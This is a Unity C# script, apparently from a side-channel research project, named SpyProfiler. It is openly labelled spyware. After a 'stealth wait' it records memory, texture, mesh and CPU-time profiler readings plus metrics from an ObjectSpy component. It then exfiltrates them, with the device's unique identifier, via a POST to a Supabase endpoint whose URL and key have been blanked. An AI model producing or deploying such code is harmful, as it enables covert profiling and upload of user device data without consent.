using System.Collections;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;
using Unity.Profiling;

public class SpyProfiler : MonoBehaviour
{
    [Header("Attack Configuration")]
    public float startDelay = 10f;     
    public float samplingRate = 0.1f;  // Take 10 samples per second
    public int captureDuration = 3;    // Only record for 3 seconds

    // REMEMBER TO PASTE THE KEYS BACK IN SO IT CAN WORK IN UNITY
    [Header("Supabase Settings")]
    private string supabaseUrl = "";
    private string supabaseKey = ""; 

    private StringBuilder csvData = new StringBuilder();
    private ObjectSpy objectSpy;

    // Sensors
    ProfilerRecorder totalReservedMemoryRecorder;
    ProfilerRecorder totalUsedMemoryRecorder;
    ProfilerRecorder textureMemoryRecorder;
    ProfilerRecorder meshMemoryRecorder;
    ProfilerRecorder mainThreadTimeRecorder;

    void Awake()
    {
        DontDestroyOnLoad(this.gameObject);
        objectSpy = GetComponent<ObjectSpy>();
        if (objectSpy == null) Debug.LogWarning("SPYWARE: No ObjectSpy found!");
    }

    void OnEnable()
    {
        totalReservedMemoryRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Memory, "Total Reserved Memory");
        totalUsedMemoryRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Memory, "Total Used Memory");
        textureMemoryRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Memory, "Texture Memory");
        meshMemoryRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Memory, "Mesh Memory");
        mainThreadTimeRecorder = ProfilerRecorder.StartNew(ProfilerCategory.Internal, "Main Thread", 15);
    }

    void OnDisable()
    {
        if (totalReservedMemoryRecorder.Valid) totalReservedMemoryRecorder.Dispose();
        if (totalUsedMemoryRecorder.Valid) totalUsedMemoryRecorder.Dispose();
        if (textureMemoryRecorder.Valid) textureMemoryRecorder.Dispose();
        if (meshMemoryRecorder.Valid) meshMemoryRecorder.Dispose();
        if (mainThreadTimeRecorder.Valid) mainThreadTimeRecorder.Dispose();
    }

    IEnumerator Start()
    {
        yield return null;

        // Build Dynamic Header
        string objectHeaders = "";
        if (objectSpy != null)
        {
            foreach (var key in objectSpy.currentMetrics.Keys)
            {
                objectHeaders += "," + key;
            }
        }

        csvData.AppendLine("Time,TotalReserved,TotalUsed,TextureMem,MeshMem,CPUTimeMS" + objectHeaders);
        StartCoroutine(AttackRoutine());
    }

    IEnumerator AttackRoutine()
    {
        // ---------------------------------------------------------
        // PHASE 1: THE STEALTH WAIT
        // ---------------------------------------------------------
        Debug.Log($"SPYWARE: Waiting {startDelay} seconds for room to load...");
        yield return new WaitForSeconds(startDelay);

        // ---------------------------------------------------------
        // PHASE 2: THE SNAPSHOT
        // ---------------------------------------------------------
        Debug.Log("SPYWARE: Capturing spatial snapshot...");
        float startTime = Time.time;

        while (Time.time < startTime + captureDuration)
        {
            float timestamp = Time.time;
            long reserved = totalReservedMemoryRecorder.LastValue;
            long used = totalUsedMemoryRecorder.LastValue;
            long texture = textureMemoryRecorder.LastValue;
            long mesh = meshMemoryRecorder.LastValue;
            double cpuTimeMS = mainThreadTimeRecorder.LastValue * (1e-6);

            string objectValues = "";
            if (objectSpy != null)
            {
                foreach (var key in objectSpy.currentMetrics.Keys)
                {
                    float val = objectSpy.currentMetrics[key];
                    objectValues += $",{val:F4}";
                }
            }

            csvData.AppendLine($"{timestamp},{reserved},{used},{texture},{mesh},{cpuTimeMS:F2}{objectValues}");

            yield return new WaitForSeconds(samplingRate);
        }

        // ---------------------------------------------------------
        // PHASE 3: EXFILTRATION
        // ---------------------------------------------------------
        Debug.Log("SPYWARE: Capture complete. Uploading...");
        yield return StartCoroutine(UploadToSupabase());
    }

    IEnumerator UploadToSupabase()
    {
        string cleanCsv = csvData.ToString().Replace("\n", "\\n").Replace("\r", "");
        string jsonPayload = "{" + "\"device_id\": \"" + SystemInfo.deviceUniqueIdentifier + "\"," + "\"csv_dump\": \"" + cleanCsv + "\"" + "}";

        using (UnityWebRequest www = new UnityWebRequest(supabaseUrl, "POST"))
        {
            byte[] bodyRaw = Encoding.UTF8.GetBytes(jsonPayload);
            www.uploadHandler = new UploadHandlerRaw(bodyRaw);
            www.downloadHandler = new DownloadHandlerBuffer();
            www.SetRequestHeader("Content-Type", "application/json");
            www.SetRequestHeader("apikey", supabaseKey);
            www.SetRequestHeader("Authorization", "Bearer " + supabaseKey);
            www.SetRequestHeader("Prefer", "return=representation");

            yield return www.SendWebRequest();

            if (www.result == UnityWebRequest.Result.Success)
            {
                Debug.Log("SPYWARE: Success!");
                csvData.Clear();
            }
            else
            {
                Debug.LogError("SPYWARE: Failed: " + www.error);
            }
        }
    }
}